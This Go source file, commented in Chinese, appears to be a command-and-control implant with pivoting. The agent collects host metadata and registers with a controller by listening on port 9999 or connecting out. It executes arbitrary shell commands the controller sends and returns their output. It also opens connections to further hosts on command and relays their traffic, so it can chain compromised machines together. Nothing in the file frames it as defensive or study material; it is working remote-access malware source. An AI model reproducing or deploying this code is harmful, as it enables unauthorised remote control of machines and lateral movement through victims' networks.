package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync"
	"time"
)

// --- 协议常量 ---
const (
	CMD_EXEC     = 0x01
	CMD_CONNECT  = 0x02
	CMD_FORWARD  = 0x03
	CMD_REGISTER = 0x04
	CMD_ACK      = 0x05
)

// --- Metadata 结构 ---
type AgentMetadata struct {
	AgentID   uint32 `json:"agent_id"` // 改为 uint32
	OS        string `json:"os"`
	Arch      string `json:"arch"`
	Hostname  string `json:"hostname"`
	Username  string `json:"username"`
	Process   string `json:"process"`
	PID       int    `json:"pid"`
	Timestamp int64  `json:"timestamp"`
}

// --- Agent 结构体 ---
type Agent struct {
	AgentID  uint32 // 改为 uint32
	Metadata AgentMetadata
	Upstream net.Conn
	Children sync.Map // Key: uint32 (RouteID)
	writeMu  sync.Mutex
}

// --- 协议工具 ---

func (a *Agent) WritePacket(cmdType byte, payload []byte) error {
	a.writeMu.Lock()
	defer a.writeMu.Unlock()

	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmdType
	copy(buf[5:], payload)

	_, err := a.Upstream.Write(buf)
	return err
}

func ReadPacket(conn net.Conn) (byte, []byte, error) {
	header := make([]byte, 4)
	if _, err := io.ReadFull(conn, header); err != nil {
		return 0, nil, err
	}
	length := binary.BigEndian.Uint32(header)
	if length > 10*1024*1024 {
		return 0, nil, fmt.Errorf("packet too large")
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(conn, body); err != nil {
		return 0, nil, err
	}
	return body[0], body[1:], nil
}

// --- 系统信息收集 ---

func collectMetadata(agentID uint32) *AgentMetadata {
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}

	return &AgentMetadata{
		AgentID:   agentID,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		Hostname:  hostname,
		Username:  username,
		Process:   os.Args[0],
		PID:       os.Getpid(),
		Timestamp: time.Now().Unix(),
	}
}

// --- ID 生成（确保在 uint32 范围内） ---
func generateAgentID() uint32 {
	// 方案1：秒级时间戳的低32位 + 随机数（避免溢出）
	timestamp := uint32(time.Now().Unix()) % 1000000 // 取模确保范围
	random := uint32(rand.Intn(1000))
	return timestamp*1000 + random // 最大约 1,000,000,000 (在 uint32 内)

	// 方案2：直接用随机数（更简单）
	// return rand.Uint32()
}

// --- 主程序 ---

func main() {
	rand.Seed(time.Now().UnixNano())
	//if len(os.Args) < 3 {
	//	fmt.Println("Usage:")
	//	fmt.Println("  agent connect <ip:port>   - 连接到父节点")
	//	fmt.Println("  agent listen <port>       - 监听等待父节点连接")
	//	return
	//}
	//
	//mode := os.Args[1]
	//addr := os.Args[2]
	mode := "listen"
	addr := "9999"

	// 生成 uint32 ID
	agentID := generateAgentID()

	agent := &Agent{
		AgentID:  agentID,
		Metadata: *collectMetadata(agentID),
	}

	fmt.Printf("[*] Generated Agent ID: %d\n", agentID)
	fmt.Printf("[*] System: %s/%s, User: %s, Host: %s\n",
		agent.Metadata.OS, agent.Metadata.Arch,
		agent.Metadata.Username, agent.Metadata.Hostname)

	var err error
	var isGateway bool

	if mode == "listen" {
		ln, err := net.Listen("tcp", ":"+addr)
		if err != nil {
			panic(err)
		}
		fmt.Printf("[*] Listening on :%s\n", addr)
		agent.Upstream, err = ln.Accept()
		isGateway = true
		if err != nil {
			panic(err)
		}
	} else if mode == "connect" {
		fmt.Printf("[*] Connecting to %s\n", addr)
		agent.Upstream, err = net.DialTimeout("tcp", addr, 10*time.Second)
		isGateway = false
		if err != nil {
			panic(err)
		}
	} else {
		fmt.Println("[-] Unknown mode")
		return
	}

	if err := agent.register(isGateway); err != nil {
		fmt.Printf("[-] Registration failed: %v\n", err)
		return
	}

	agent.HandleUpstream()
}

func (a *Agent) register(isGateway bool) error {
	metaJSON, err := json.Marshal(a.Metadata)
	if err != nil {
		return err
	}

	if err := a.WritePacket(CMD_REGISTER, metaJSON); err != nil {
		return err
	}

	cmdType, data, err := ReadPacket(a.Upstream)
	if err != nil {
		return fmt.Errorf("failed to receive ACK: %v", err)
	}

	if cmdType != CMD_ACK {
		return fmt.Errorf("expected ACK, got %d", cmdType)
	}

	ackID := binary.BigEndian.Uint32(data) // 4字节解析
	if ackID != a.AgentID {
		fmt.Printf("[!] Server ACK with different ID: %d (expected %d)\n", ackID, a.AgentID)
	}

	fmt.Printf("[+] Registered with Server, ID: %d\n", a.AgentID)
	return nil
}

func (a *Agent) HandleUpstream() {
	defer a.Upstream.Close()

	for {
		cmdType, data, err := ReadPacket(a.Upstream)
		if err != nil {
			fmt.Println("[-] Upstream lost:", err)
			os.Exit(1)
		}

		switch cmdType {
		case CMD_EXEC:
			cmdStr := string(data)
			fmt.Printf("[*] Exec: %s\n", cmdStr)
			go func() {
				result := a.RunCmd(cmdStr)
				a.WritePacket(CMD_EXEC, []byte(result))
			}()

		case CMD_CONNECT:
			target := string(data)
			fmt.Printf("[*] Connect to: %s\n", target)
			go a.AddPivot(target)

		case CMD_ACK:
			fmt.Printf("[*] Received ACK from upstream\n")

		case CMD_FORWARD:
			if len(data) < 4 {
				continue
			}
			routeID := binary.BigEndian.Uint32(data[0:4]) // 4字节解析
			payload := data[4:]

			val, ok := a.Children.Load(routeID)
			if !ok {
				a.WritePacket(CMD_EXEC, []byte(fmt.Sprintf("[-] Route %d not found", routeID)))
				continue
			}

			childConn := val.(net.Conn)
			if _, err := childConn.Write(payload); err != nil {
				fmt.Printf("[-] Forward to child %d failed: %v\n", routeID, err)
				a.Children.Delete(routeID)
				childConn.Close()
			}
		}
	}
}

// AddPivot 只建立连接，等待子节点发送注册信息后转发
func (a *Agent) AddPivot(target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		a.WritePacket(CMD_EXEC, []byte(fmt.Sprintf("[-] Connect to %s failed: %v", target, err)))
		return
	}

	routeID := uint32(rand.Intn(90000) + 10000)
	a.Children.Store(routeID, conn)
	fmt.Printf("[+] Pivot established with %s (Local RouteID: %d)\n", target, routeID)

	// 启动 handleChild 监听子节点数据（包括注册包）
	go a.handleChild(routeID, conn)

}

func (a *Agent) handleChild(routeID uint32, conn net.Conn) {
	defer conn.Close()
	defer a.Children.Delete(routeID)

	for {
		cmdType, payload, err := ReadPacket(conn)
		if err != nil {
			fmt.Printf("[-] Child %d disconnected\n", routeID)
			return
		}

		innerPacket := makePacket(cmdType, payload)

		// 封装：[4字节 RouteID][InnerPacket]
		wrapData := make([]byte, 4+len(innerPacket))
		binary.BigEndian.PutUint32(wrapData[0:4], routeID) // 4字节
		copy(wrapData[4:], innerPacket)

		if err := a.WritePacket(CMD_FORWARD, wrapData); err != nil {
			fmt.Printf("[-] Upload failed: %v\n", err)
			return
		}
	}
}

func makePacket(cmdType byte, payload []byte) []byte {
	buf := make([]byte, 4+1+len(payload))
	binary.BigEndian.PutUint32(buf[0:4], uint32(1+len(payload)))
	buf[4] = cmdType
	copy(buf[5:], payload)
	return buf
}

func (a *Agent) RunCmd(cmdStr string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\n%s", err, string(out))
	}
	return string(out)
}
